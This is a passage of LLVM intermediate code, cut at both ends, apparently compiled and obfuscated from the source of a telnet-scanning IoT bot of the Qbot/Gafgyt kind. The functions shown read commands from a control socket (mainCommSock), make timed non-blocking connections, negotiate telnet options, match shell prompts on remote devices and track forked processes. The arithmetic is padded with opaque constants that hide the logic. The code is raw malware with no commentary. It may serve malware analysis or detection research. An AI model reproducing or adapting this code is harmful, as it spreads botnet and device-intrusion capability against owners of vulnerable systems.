  %27 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %26) #2, !srcloc !1
  %28 = extractvalue { i64, i64* } %27, 0
  %29 = extractvalue { i64, i64* } %27, 1
  %30 = trunc i64 %28 to i32
  store i32 %30, i32* %10, align 4
  %31 = ptrtoint i64* %29 to i64
  %32 = trunc i64 %31 to i32
  store i32 %32, i32* %11, align 4
  br label %33

; <label>:33:                                     ; preds = %24
  %34 = load i32, i32* %5, align 4
  %35 = srem i32 %34, 64
  %36 = zext i32 %35 to i64
  %37 = shl i64 1, %36
  %38 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %39 = load i32, i32* %5, align 4
  %40 = sdiv i32 %39, 64
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds [16 x i64], [16 x i64]* %38, i64 0, i64 %41
  %43 = load i64, i64* %42, align 8
  %44 = and i64 %43, %37
  %45 = xor i64 %43, %37
  %46 = or i64 %44, %45
  %47 = or i64 %43, %37
  store i64 %46, i64* %42, align 8
  %48 = load i32, i32* %5, align 4
  %49 = sub i32 0, %48
  %50 = sub i32 0, 1
  %51 = add i32 %49, %50
  %52 = sub i32 0, %51
  %53 = add nsw i32 %48, 1
  %54 = call i32 @select(i32 %52, %struct.__sigset_t* %8, %struct.__sigset_t* null, %struct.__sigset_t* %8, %struct.timeval* %9)
  store i32 %54, i32* %12, align 4
  %55 = icmp sle i32 %54, 0
  br i1 %55, label %56, label %103

; <label>:56:                                     ; preds = %33
  br label %57

; <label>:57:                                     ; preds = %95, %56
  %58 = load i32, i32* %13, align 4
  %59 = icmp slt i32 %58, 10
  br i1 %59, label %60, label %102

; <label>:60:                                     ; preds = %57
  %61 = load i32, i32* @mainCommSock, align 4
  %62 = call i32 (i32, i8*, ...) @sockprintf(i32 %61, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.23, i32 0, i32 0))
  %63 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %63, align 8
  %64 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %64, align 8
  br label %65

; <label>:65:                                     ; preds = %60
  %66 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %67 = getelementptr inbounds [16 x i64], [16 x i64]* %66, i64 0, i64 0
  %68 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %67) #2, !srcloc !2
  %69 = extractvalue { i64, i64* } %68, 0
  %70 = extractvalue { i64, i64* } %68, 1
  %71 = trunc i64 %69 to i32
  store i32 %71, i32* %14, align 4
  %72 = ptrtoint i64* %70 to i64
  %73 = trunc i64 %72 to i32
  store i32 %73, i32* %15, align 4
  br label %74

; <label>:74:                                     ; preds = %65
  %75 = load i32, i32* %5, align 4
  %76 = srem i32 %75, 64
  %77 = zext i32 %76 to i64
  %78 = shl i64 1, %77
  %79 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %8, i32 0, i32 0
  %80 = load i32, i32* %5, align 4
  %81 = sdiv i32 %80, 64
  %82 = sext i32 %81 to i64
  %83 = getelementptr inbounds [16 x i64], [16 x i64]* %79, i64 0, i64 %82
  %84 = load i64, i64* %83, align 8
  %85 = and i64 %84, %78
  %86 = xor i64 %84, %78
  %87 = or i64 %85, %86
  %88 = or i64 %84, %78
  store i64 %87, i64* %83, align 8
  %89 = load i32, i32* %5, align 4
  %90 = sub i32 0, 1
  %91 = sub i32 %89, %90
  %92 = add nsw i32 %89, 1
  %93 = call i32 @select(i32 %91, %struct.__sigset_t* %8, %struct.__sigset_t* null, %struct.__sigset_t* %8, %struct.timeval* %9)
  store i32 %93, i32* %12, align 4
  %94 = icmp sle i32 %93, 0
  br i1 %94, label %95, label %101

; <label>:95:                                     ; preds = %74
  %96 = load i32, i32* %13, align 4
  %97 = add i32 %96, 354056741
  %98 = add i32 %97, 1
  %99 = sub i32 %98, 354056741
  %100 = add nsw i32 %96, 1
  store i32 %99, i32* %13, align 4
  br label %57

; <label>:101:                                    ; preds = %74
  br label %102

; <label>:102:                                    ; preds = %101, %57
  br label %103

; <label>:103:                                    ; preds = %102, %33
  store i32 0, i32* %18, align 4
  %104 = load i8*, i8** %6, align 8
  store i8* %104, i8** %17, align 8
  br label %105

; <label>:105:                                    ; preds = %126, %103
  %106 = load i32, i32* %7, align 4
  %107 = add i32 %106, -2128955263
  %108 = add i32 %107, -1
  %109 = sub i32 %108, -2128955263
  %110 = add nsw i32 %106, -1
  store i32 %109, i32* %7, align 4
  %111 = icmp sgt i32 %106, 1
  br i1 %111, label %112, label %133

; <label>:112:                                    ; preds = %105
  %113 = load i32, i32* @mainCommSock, align 4
  %114 = call i64 @recv(i32 %113, i8* %16, i64 1, i32 0)
  %115 = icmp ne i64 %114, 1
  br i1 %115, label %116, label %118

; <label>:116:                                    ; preds = %112
  %117 = load i8*, i8** %17, align 8
  store i8 0, i8* %117, align 1
  store i32 -1, i32* %4, align 4
  br label %136

; <label>:118:                                    ; preds = %112
  %119 = load i8, i8* %16, align 1
  %120 = load i8*, i8** %17, align 8
  %121 = getelementptr inbounds i8, i8* %120, i32 1
  store i8* %121, i8** %17, align 8
  store i8 %119, i8* %120, align 1
  %122 = load i8, i8* %16, align 1
  %123 = zext i8 %122 to i32
  %124 = icmp eq i32 %123, 10
  br i1 %124, label %125, label %126

; <label>:125:                                    ; preds = %118
  br label %133

; <label>:126:                                    ; preds = %118
  %127 = load i32, i32* %18, align 4
  %128 = sub i32 0, %127
  %129 = sub i32 0, 1
  %130 = add i32 %128, %129
  %131 = sub i32 0, %130
  %132 = add nsw i32 %127, 1
  store i32 %131, i32* %18, align 4
  br label %105

; <label>:133:                                    ; preds = %125, %105
  %134 = load i8*, i8** %17, align 8
  store i8 0, i8* %134, align 1
  %135 = load i32, i32* %18, align 4
  store i32 %135, i32* %4, align 4
  br label %136

; <label>:136:                                    ; preds = %133, %116
  %137 = load i32, i32* %4, align 4
  ret i32 %137
}

declare i32 @select(i32, %struct.__sigset_t*, %struct.__sigset_t*, %struct.__sigset_t*, %struct.timeval*) #3

declare i64 @recv(i32, i8*, i64, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca %struct.__sigset_t, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i64, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i8* %1, i8** %7, align 8
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  %19 = load i32, i32* %6, align 4
  %20 = call i32 (i32, i32, ...) @fcntl(i32 %19, i32 3, i8* null)
  %21 = sext i32 %20 to i64
  store i64 %21, i64* %15, align 8
  %22 = load i64, i64* %15, align 8
  %23 = xor i64 %22, -1
  %24 = xor i64 2048, -1
  %25 = xor i64 -5819145966561639178, -1
  %26 = and i64 %23, -5819145966561639178
  %27 = and i64 %22, %25
  %28 = and i64 %24, -5819145966561639178
  %29 = and i64 2048, %25
  %30 = or i64 %26, %27
  %31 = or i64 %28, %29
  %32 = xor i64 %30, %31
  %33 = or i64 %23, %24
  %34 = xor i64 %33, -1
  %35 = or i64 -5819145966561639178, %25
  %36 = and i64 %34, %35
  %37 = or i64 %32, %36
  %38 = or i64 %22, 2048
  store i64 %37, i64* %15, align 8
  %39 = load i32, i32* %6, align 4
  %40 = load i64, i64* %15, align 8
  %41 = call i32 (i32, i32, ...) @fcntl(i32 %39, i32 4, i64 %40)
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 2, i16* %42, align 4
  %43 = load i32, i32* %8, align 4
  %44 = trunc i32 %43 to i16
  %45 = call zeroext i16 @htons(i16 zeroext %44) #13
  %46 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %45, i16* %46, align 2
  %47 = load i8*, i8** %7, align 8
  %48 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %49 = call i32 @getHost(i8* %47, %struct.in_addr* %48)
  %50 = icmp ne i32 %49, 0
  br i1 %50, label %51, label %52

; <label>:51:                                     ; preds = %4
  store i32 0, i32* %5, align 4
  br label %129

; <label>:52:                                     ; preds = %4
  %53 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %54 = getelementptr inbounds [8 x i8], [8 x i8]* %53, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %54, i8 0, i64 8, i32 4, i1 false)
  %55 = load i32, i32* %6, align 4
  %56 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %57 = call i32 @connect(i32 %55, %struct.sockaddr* %56, i32 16)
  store i32 %57, i32* %16, align 4
  %58 = load i32, i32* %16, align 4
  %59 = icmp slt i32 %58, 0
  br i1 %59, label %60, label %113

; <label>:60:                                     ; preds = %52
  %61 = call i32* @__errno_location() #13
  %62 = load i32, i32* %61, align 4
  %63 = icmp eq i32 %62, 115
  br i1 %63, label %64, label %111

; <label>:64:                                     ; preds = %60
  %65 = load i32, i32* %9, align 4
  %66 = sext i32 %65 to i64
  %67 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 %66, i64* %67, align 8
  %68 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %68, align 8
  br label %69

; <label>:69:                                     ; preds = %64
  %70 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %71 = getelementptr inbounds [16 x i64], [16 x i64]* %70, i64 0, i64 0
  %72 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %71) #2, !srcloc !3
  %73 = extractvalue { i64, i64* } %72, 0
  %74 = extractvalue { i64, i64* } %72, 1
  %75 = trunc i64 %73 to i32
  store i32 %75, i32* %17, align 4
  %76 = ptrtoint i64* %74 to i64
  %77 = trunc i64 %76 to i32
  store i32 %77, i32* %18, align 4
  br label %78

; <label>:78:                                     ; preds = %69
  %79 = load i32, i32* %6, align 4
  %80 = srem i32 %79, 64
  %81 = zext i32 %80 to i64
  %82 = shl i64 1, %81
  %83 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %84 = load i32, i32* %6, align 4
  %85 = sdiv i32 %84, 64
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds [16 x i64], [16 x i64]* %83, i64 0, i64 %86
  %88 = load i64, i64* %87, align 8
  %89 = and i64 %88, %82
  %90 = xor i64 %88, %82
  %91 = or i64 %89, %90
  %92 = or i64 %88, %82
  store i64 %91, i64* %87, align 8
  %93 = load i32, i32* %6, align 4
  %94 = sub i32 0, %93
  %95 = sub i32 0, 1
  %96 = add i32 %94, %95
  %97 = sub i32 0, %96
  %98 = add nsw i32 %93, 1
  %99 = call i32 @select(i32 %97, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.__sigset_t* null, %struct.timeval* %12)
  %100 = icmp sgt i32 %99, 0
  br i1 %100, label %101, label %109

; <label>:101:                                    ; preds = %78
  store i32 4, i32* %13, align 4
  %102 = load i32, i32* %6, align 4
  %103 = bitcast i32* %14 to i8*
  %104 = call i32 @getsockopt(i32 %102, i32 1, i32 4, i8* %103, i32* %13) #2
  %105 = load i32, i32* %14, align 4
  %106 = icmp ne i32 %105, 0
  br i1 %106, label %107, label %108

; <label>:107:                                    ; preds = %101
  store i32 0, i32* %5, align 4
  br label %129

; <label>:108:                                    ; preds = %101
  br label %110

; <label>:109:                                    ; preds = %78
  store i32 0, i32* %5, align 4
  br label %129

; <label>:110:                                    ; preds = %108
  br label %112

; <label>:111:                                    ; preds = %60
  store i32 0, i32* %5, align 4
  br label %129

; <label>:112:                                    ; preds = %110
  br label %113

; <label>:113:                                    ; preds = %112, %52
  %114 = load i32, i32* %6, align 4
  %115 = call i32 (i32, i32, ...) @fcntl(i32 %114, i32 3, i8* null)
  %116 = sext i32 %115 to i64
  store i64 %116, i64* %15, align 8
  %117 = load i64, i64* %15, align 8
  %118 = xor i64 %117, -1
  %119 = xor i64 -2049, -1
  %120 = xor i64 -5586032779771113249, -1
  %121 = or i64 %118, %119
  %122 = or i64 -5586032779771113249, %120
  %123 = xor i64 %121, -1
  %124 = and i64 %123, %122
  %125 = and i64 %117, -2049
  store i64 %124, i64* %15, align 8
  %126 = load i32, i32* %6, align 4
  %127 = load i64, i64* %15, align 8
  %128 = call i32 (i32, i32, ...) @fcntl(i32 %126, i32 4, i64 %127)
  store i32 1, i32* %5, align 4
  br label %129

; <label>:129:                                    ; preds = %113, %111, %109, %107, %51
  %130 = load i32, i32* %5, align 4
  ret i32 %130
}

declare i32 @fcntl(i32, i32, ...) #3

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #8

declare i32 @connect(i32, %struct.sockaddr*, i32) #3

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32*, align 8
  %4 = alloca i32, align 4
  %5 = call i32 @fork() #2
  store i32 %5, i32* %2, align 4
  %6 = load i32, i32* %2, align 4
  %7 = icmp ule i32 %6, 0
  br i1 %7, label %8, label %10

; <label>:8:                                      ; preds = %0
  %9 = load i32, i32* %2, align 4
  store i32 %9, i32* %1, align 4
  br label %62

; <label>:10:                                     ; preds = %0
  %11 = load i64, i64* @numpids, align 8
  %12 = add i64 %11, 1760182998475615011
  %13 = add i64 %12, 1
  %14 = sub i64 %13, 1760182998475615011
  %15 = add i64 %11, 1
  store i64 %14, i64* @numpids, align 8
  %16 = load i64, i64* @numpids, align 8
  %17 = add i64 %16, -7317769541648440915
  %18 = add i64 %17, 1
  %19 = sub i64 %18, -7317769541648440915
  %20 = add i64 %16, 1
  %21 = mul i64 %19, 4
  %22 = call noalias i8* @malloc(i64 %21) #2
  %23 = bitcast i8* %22 to i32*
  store i32* %23, i32** %3, align 8
  store i32 0, i32* %4, align 4
  br label %24

; <label>:24:                                     ; preds = %43, %10
  %25 = load i32, i32* %4, align 4
  %26 = zext i32 %25 to i64
  %27 = load i64, i64* @numpids, align 8
  %28 = add i64 %27, -1636870820335379752
  %29 = sub i64 %28, 1
  %30 = sub i64 %29, -1636870820335379752
  %31 = sub i64 %27, 1
  %32 = icmp ult i64 %26, %30
  br i1 %32, label %33, label %49

; <label>:33:                                     ; preds = %24
  %34 = load i32*, i32** @pids, align 8
  %35 = load i32, i32* %4, align 4
  %36 = zext i32 %35 to i64
  %37 = getelementptr inbounds i32, i32* %34, i64 %36
  %38 = load i32, i32* %37, align 4
  %39 = load i32*, i32** %3, align 8
  %40 = load i32, i32* %4, align 4
  %41 = zext i32 %40 to i64
  %42 = getelementptr inbounds i32, i32* %39, i64 %41
  store i32 %38, i32* %42, align 4
  br label %43

; <label>:43:                                     ; preds = %33
  %44 = load i32, i32* %4, align 4
  %45 = sub i32 %44, 1167849331
  %46 = add i32 %45, 1
  %47 = add i32 %46, 1167849331
  %48 = add i32 %44, 1
  store i32 %47, i32* %4, align 4
  br label %24

; <label>:49:                                     ; preds = %24
  %50 = load i32, i32* %2, align 4
  %51 = load i32*, i32** %3, align 8
  %52 = load i64, i64* @numpids, align 8
  %53 = sub i64 %52, 4659602526400420564
  %54 = sub i64 %53, 1
  %55 = add i64 %54, 4659602526400420564
  %56 = sub i64 %52, 1
  %57 = getelementptr inbounds i32, i32* %51, i64 %55
  store i32 %50, i32* %57, align 4
  %58 = load i32*, i32** @pids, align 8
  %59 = bitcast i32* %58 to i8*
  call void @free(i8* %59) #2
  %60 = load i32*, i32** %3, align 8
  store i32* %60, i32** @pids, align 8
  %61 = load i32, i32* %2, align 4
  store i32 %61, i32* %1, align 4
  br label %62

; <label>:62:                                     ; preds = %49, %8
  %63 = load i32, i32* %1, align 4
  ret i32 %63
}

; Function Attrs: nounwind
declare i32 @fork() #4

; Function Attrs: noinline nounwind uwtable
define i32 @negotiate(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %9 = load i8*, i8** %6, align 8
  %10 = getelementptr inbounds i8, i8* %9, i64 1
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  switch i32 %12, label %61 [
    i32 255, label %13
    i32 251, label %14
    i32 252, label %14
    i32 253, label %14
    i32 254, label %14
  ]

; <label>:13:                                     ; preds = %3
  store i32 0, i32* %4, align 4
  br label %63

; <label>:14:                                     ; preds = %3, %3, %3, %3
  store i8 -1, i8* %8, align 1
  %15 = load i32, i32* %5, align 4
  %16 = call i64 @send(i32 %15, i8* %8, i64 1, i32 16384)
  %17 = load i8*, i8** %6, align 8
  %18 = getelementptr inbounds i8, i8* %17, i64 1
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 252, %20
  br i1 %21, label %22, label %23

; <label>:22:                                     ; preds = %14
  store i8 -2, i8* %8, align 1
  br label %54

; <label>:23:                                     ; preds = %14
  %24 = load i8*, i8** %6, align 8
  %25 = getelementptr inbounds i8, i8* %24, i64 1
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 254, %27
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %23
  store i8 -4, i8* %8, align 1
  br label %53

; <label>:30:                                     ; preds = %23
  %31 = load i8*, i8** %6, align 8
  %32 = getelementptr inbounds i8, i8* %31, i64 1
  %33 = load i8, i8* %32, align 1
  %34 = zext i8 %33 to i32
  %35 = icmp eq i32 3, %34
  br i1 %35, label %36, label %44

; <label>:36:                                     ; preds = %30
  %37 = load i8*, i8** %6, align 8
  %38 = getelementptr inbounds i8, i8* %37, i64 1
  %39 = load i8, i8* %38, align 1
  %40 = zext i8 %39 to i32
  %41 = icmp eq i32 %40, 253
  %42 = select i1 %41, i32 251, i32 253
  %43 = trunc i32 %42 to i8
  store i8 %43, i8* %8, align 1
  br label %52

; <label>:44:                                     ; preds = %30
  %45 = load i8*, i8** %6, align 8
  %46 = getelementptr inbounds i8, i8* %45, i64 1
  %47 = load i8, i8* %46, align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 253
  %50 = select i1 %49, i32 252, i32 254
  %51 = trunc i32 %50 to i8
  store i8 %51, i8* %8, align 1
  br label %52

; <label>:52:                                     ; preds = %44, %36
  br label %53

; <label>:53:                                     ; preds = %52, %29
  br label %54

; <label>:54:                                     ; preds = %53, %22
  %55 = load i32, i32* %5, align 4
  %56 = call i64 @send(i32 %55, i8* %8, i64 1, i32 16384)
  %57 = load i32, i32* %5, align 4
  %58 = load i8*, i8** %6, align 8
  %59 = getelementptr inbounds i8, i8* %58, i64 2
  %60 = call i64 @send(i32 %57, i8* %59, i64 1, i32 16384)
  br label %62

; <label>:61:                                     ; preds = %3
  br label %62

; <label>:62:                                     ; preds = %61, %54
  store i32 0, i32* %4, align 4
  br label %63

; <label>:63:                                     ; preds = %62, %13
  %64 = load i32, i32* %4, align 4
  ret i32 %64
}

; Function Attrs: noinline nounwind uwtable
define i32 @matchPrompt(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.24, i32 0, i32 0), i8** %4, align 8
  %8 = load i8*, i8** %3, align 8
  %9 = call i64 @strlen(i8* %8) #10
  %10 = trunc i64 %9 to i32
  store i32 %10, i32* %5, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  br label %11

; <label>:11:                                     ; preds = %116, %1
  %12 = load i32, i32* %6, align 4
  %13 = sext i32 %12 to i64
  %14 = load i8*, i8** %4, align 8
  %15 = call i64 @strlen(i8* %14) #10
  %16 = icmp ult i64 %13, %15
  br i1 %16, label %17, label %123

; <label>:17:                                     ; preds = %11
  br label %18

; <label>:18:                                     ; preds = %86, %17
  %19 = load i32, i32* %5, align 4
  %20 = load i32, i32* %7, align 4
  %21 = icmp sgt i32 %19, %20
  br i1 %21, label %22, label %84

; <label>:22:                                     ; preds = %18
  %23 = load i8*, i8** %3, align 8
  %24 = load i32, i32* %5, align 4
  %25 = sext i32 %24 to i64
  %26 = getelementptr inbounds i8, i8* %23, i64 %25
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = sub i64 0, 5503770603591359783
  %30 = sub i64 %29, %28
  %31 = add i64 %30, 5503770603591359783
  %32 = sub i64 0, %28
  %33 = getelementptr inbounds i8, i8* %26, i64 %31
  %34 = load i8, i8* %33, align 1
  %35 = sext i8 %34 to i32
  %36 = icmp eq i32 %35, 0
  br i1 %36, label %82, label %37

; <label>:37:                                     ; preds = %22
  %38 = load i8*, i8** %3, align 8
  %39 = load i32, i32* %5, align 4
  %40 = sext i32 %39 to i64
  %41 = getelementptr inbounds i8, i8* %38, i64 %40
  %42 = load i32, i32* %7, align 4
  %43 = sext i32 %42 to i64
  %44 = add i64 0, 7473450890658617411
  %45 = sub i64 %44, %43
  %46 = sub i64 %45, 7473450890658617411
  %47 = sub i64 0, %43
  %48 = getelementptr inbounds i8, i8* %41, i64 %46
  %49 = load i8, i8* %48, align 1
  %50 = sext i8 %49 to i32
  %51 = icmp eq i32 %50, 32
  br i1 %51, label %82, label %52

; <label>:52:                                     ; preds = %37
  %53 = load i8*, i8** %3, align 8
  %54 = load i32, i32* %5, align 4
  %55 = sext i32 %54 to i64
  %56 = getelementptr inbounds i8, i8* %53, i64 %55
  %57 = load i32, i32* %7, align 4
  %58 = sext i32 %57 to i64
  %59 = sub i64 0, -8127239024845656401
  %60 = sub i64 %59, %58
  %61 = add i64 %60, -8127239024845656401
  %62 = sub i64 0, %58
  %63 = getelementptr inbounds i8, i8* %56, i64 %61
  %64 = load i8, i8* %63, align 1
  %65 = sext i8 %64 to i32
  %66 = icmp eq i32 %65, 13
  br i1 %66, label %82, label %67

; <label>:67:                                     ; preds = %52
  %68 = load i8*, i8** %3, align 8
  %69 = load i32, i32* %5, align 4
  %70 = sext i32 %69 to i64
  %71 = getelementptr inbounds i8, i8* %68, i64 %70
  %72 = load i32, i32* %7, align 4
  %73 = sext i32 %72 to i64
  %74 = add i64 0, 5553908038637076067
  %75 = sub i64 %74, %73
  %76 = sub i64 %75, 5553908038637076067
  %77 = sub i64 0, %73
  %78 = getelementptr inbounds i8, i8* %71, i64 %76
  %79 = load i8, i8* %78, align 1
  %80 = sext i8 %79 to i32
  %81 = icmp eq i32 %80, 10
  br label %82

; <label>:82:                                     ; preds = %67, %52, %37, %22
  %83 = phi i1 [ true, %52 ], [ true, %37 ], [ true, %22 ], [ %81, %67 ]
  br label %84

; <label>:84:                                     ; preds = %82, %18
  %85 = phi i1 [ false, %18 ], [ %83, %82 ]
  br i1 %85, label %86, label %93

; <label>:86:                                     ; preds = %84
  %87 = load i32, i32* %7, align 4
  %88 = sub i32 0, %87
  %89 = sub i32 0, 1
  %90 = add i32 %88, %89
  %91 = sub i32 0, %90
  %92 = add nsw i32 %87, 1
  store i32 %91, i32* %7, align 4
  br label %18

; <label>:93:                                     ; preds = %84
  %94 = load i8*, i8** %3, align 8
  %95 = load i32, i32* %5, align 4
  %96 = sext i32 %95 to i64
  %97 = getelementptr inbounds i8, i8* %94, i64 %96
  %98 = load i32, i32* %7, align 4
  %99 = sext i32 %98 to i64
  %100 = sub i64 0, 2586502427704681981
  %101 = sub i64 %100, %99
  %102 = add i64 %101, 2586502427704681981
  %103 = sub i64 0, %99
  %104 = getelementptr inbounds i8, i8* %97, i64 %102
  %105 = load i8, i8* %104, align 1
  %106 = sext i8 %105 to i32
  %107 = load i8*, i8** %4, align 8
  %108 = load i32, i32* %6, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds i8, i8* %107, i64 %109
  %111 = load i8, i8* %110, align 1
  %112 = sext i8 %111 to i32
  %113 = icmp eq i32 %106, %112
  br i1 %113, label %114, label %115

; <label>:114:                                    ; preds = %93
  store i32 1, i32* %2, align 4
  br label %124

; <label>:115:                                    ; preds = %93
  br label %116

; <label>:116:                                    ; preds = %115
  %117 = load i32, i32* %6, align 4
  %118 = sub i32 0, %117
  %119 = sub i32 0, 1
  %120 = add i32 %118, %119
  %121 = sub i32 0, %120
  %122 = add nsw i32 %117, 1
  store i32 %121, i32* %6, align 4
  br label %11

; <label>:123:                                    ; preds = %11
  store i32 0, i32* %2, align 4
  br label %124

; <label>:124:                                    ; preds = %123, %114
  %125 = load i32, i32* %2, align 4
  ret i32 %125
}

; Function Attrs: noinline nounwind uwtable
define i32 @readUntil(i32, i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca %struct.__sigset_t, align 8
  %22 = alloca %struct.timeval, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i32 %0, i32* %10, align 4
  store i8* %1, i8** %11, align 8
  store i32 %2, i32* %12, align 4
  store i32 %3, i32* %13, align 4
  store i32 %4, i32* %14, align 4
  store i8* %5, i8** %15, align 8
  store i32 %6, i32* %16, align 4
  store i32 %7, i32* %17, align 4
  %26 = load i32, i32* %17, align 4
  store i32 %26, i32* %18, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %27 = load i32, i32* %13, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
  store i64 %28, i64* %29, align 8
  %30 = load i32, i32* %14, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  store i64 %31, i64* %32, align 8
  store i8* null, i8** %23, align 8
  br label %33

; <label>:33:                                     ; preds = %164, %8
  %34 = load i32, i32* %18, align 4
  %35 = sub i32 0, %34
  %36 = sub i32 0, 2
  %37 = add i32 %35, %36
  %38 = sub i32 0, %37
  %39 = add nsw i32 %34, 2
  %40 = load i32, i32* %16, align 4
  %41 = icmp slt i32 %38, %40
  br i1 %41, label %42, label %52

; <label>:42:                                     ; preds = %33
  %43 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
  %44 = load i64, i64* %43, align 8
  %45 = icmp sgt i64 %44, 0
  br i1 %45, label %50, label %46

; <label>:46:                                     ; preds = %42
  %47 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  %48 = load i64, i64* %47, align 8
  %49 = icmp sgt i64 %48, 0
  br label %50

; <label>:50:                                     ; preds = %46, %42
  %51 = phi i1 [ true, %42 ], [ %49, %46 ]
  br label %52

; <label>:52:                                     ; preds = %50, %33
  %53 = phi i1 [ false, %33 ], [ %51, %50 ]
  br i1 %53, label %54, label %165

; <label>:54:                                     ; preds = %52
  br label %55

; <label>:55:                                     ; preds = %54
  %56 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %21, i32 0, i32 0
  %57 = getelementptr inbounds [16 x i64], [16 x i64]* %56, i64 0, i64 0
  %58 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %57) #2, !srcloc !4
  %59 = extractvalue { i64, i64* } %58, 0
  %60 = extractvalue { i64, i64* } %58, 1
  %61 = trunc i64 %59 to i32
  store i32 %61, i32* %24, align 4
  %62 = ptrtoint i64* %60 to i64
  %63 = trunc i64 %62 to i32
  store i32 %63, i32* %25, align 4
  br label %64

; <label>:64:                                     ; preds = %55
  %65 = load i32, i32* %10, align 4
  %66 = srem i32 %65, 64
  %67 = zext i32 %66 to i64
  %68 = shl i64 1, %67
  %69 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %21, i32 0, i32 0
  %70 = load i32, i32* %10, align 4
  %71 = sdiv i32 %70, 64
  %72 = sext i32 %71 to i64
  %73 = getelementptr inbounds [16 x i64], [16 x i64]* %69, i64 0, i64 %72
  %74 = load i64, i64* %73, align 8
  %75 = xor i64 %74, -1
  %76 = xor i64 %68, -1
  %77 = xor i64 -4990784065860926730, -1
  %78 = and i64 %75, -4990784065860926730
  %79 = and i64 %74, %77
  %80 = and i64 %76, -4990784065860926730
  %81 = and i64 %68, %77
  %82 = or i64 %78, %79
